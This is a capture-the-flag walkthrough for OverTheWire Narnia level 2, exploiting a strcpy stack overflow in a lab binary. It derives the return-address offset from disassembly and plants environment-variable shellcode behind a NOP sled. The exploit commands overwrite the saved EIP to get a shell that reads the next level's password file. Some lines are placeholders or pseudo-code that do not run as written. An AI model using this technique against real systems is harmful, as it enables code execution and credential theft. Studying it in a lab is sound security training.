# OverTheWire — Narnia Level 2 → 3

> Goal: Get narnia3 password from `narnia2`. Result: **`**********`** (hidden)
> Technique: `strcpy` overflow → **Saved EIP** overwrite → jump to NOP sled+shellcode in env.

---

## 1. Connection
```bash
ssh narnia2@narnia.labs.overthewire.org -p 2226
```

## 2. Source
```c
int main(int argc, char *argv[]){
    char buf[128];
    if(argc == 1){ printf("Usage: %s argument\n", argv[0]); exit(1); }
    strcpy(buf, argv[1]);   // BUG: no bounds check, input from argv[1] (NOT stdin)
    printf("%s", buf);
}
```

## 3. Offset — from disasm (**VERIFIED = 132**, not 140 as in the walkthrough!)
```
08049189:  add  esp, 0xffffff80      ; = sub esp, 0x80  (128 byte frame, NO extra padding)
...
80491b5:   lea  eax, [ebp-0x80]      ; buf = ebp-0x80
80491b9:   call strcpy@plt
```
`buf = ebp-0x80` (128), saved EIP at `ebp+4` → distance = `0x80 + 4 = **132**`.

> ⚠️ **Live finding:** The walkthrough uses **140** as the offset; in this binary
> `sub esp,0x80` (no extra padding) makes the real offset **132**. Trying 140 writes
> `AAAA` (0x41414141) into EIP → segfault. Verified at 132 from disasm after that.

```
[ buf (128) ][ saved ebp (4) ][ saved eip (4) ]
  └─────── 132 padding (128+4) ──────┘ └ RET → env sled ┘
```

## 4. Address finding (getenvaddr, ASLR disabled)
Put shellcode in `EGG` with a large NOP sled (20000). Use a helper with the **same path
length** (15 chars = `len("/narnia/narnia2")`) to find `getenv("EGG")` address → correction = 0:
```c
int main(int c,char**v){ printf("ADDR=%p\n",(void*)getenv(v[1])); return 0; }
```
> `gcc` cannot write to the home directory ("Cannot create temporary file in ./") → **`cd /tmp`** is required.

## 5. Exploit
```bash
cd /tmp
gcc -m32 -o /tmp/genvaddr12 ga.c                  # 15-char path
export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*20000 + SHELLCODE_57)')
ADDR=$(/tmp/genvaddr12 EGG /narnia/narnia2 | sed -n 's/ADDR=0x\([0-9a-f]*\)/\1/p')   # e.g. ffff8f9e
RET=$((0x$ADDR + 10000))                          # sled midpoint -> e.g. ffff6a... +10000
python3 -c 'timed: wait, then "id; cat /etc/narnia_pass/narnia3"' | \
  /narnia/narnia2 "$(python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*132 + struct.pack('<I', RET))")"
```
Output: `ADDR=ffff8f9e RET=ffffb6ae` → `uid=14003(narnia3)` → password.


## Lessons
| Topic | Note |
|-------|------|
| Offset 132 | `buf=ebp-0x80` → 128+4; **verify from disasm** (walkthrough's 140 is wrong) |
| argv input | `./narnia2 "$payload"`, NOT pipe (`argc==1` → Usage) |
| env address | 15-char matching path → `getenv` direct; 20KB sled absorbs tolerance |
| gcc /tmp | Home dir is not writable → `cd /tmp` |
| segfault → fix | rc=139 + EIP=0x41414141 → offset too large; fix from disasm |
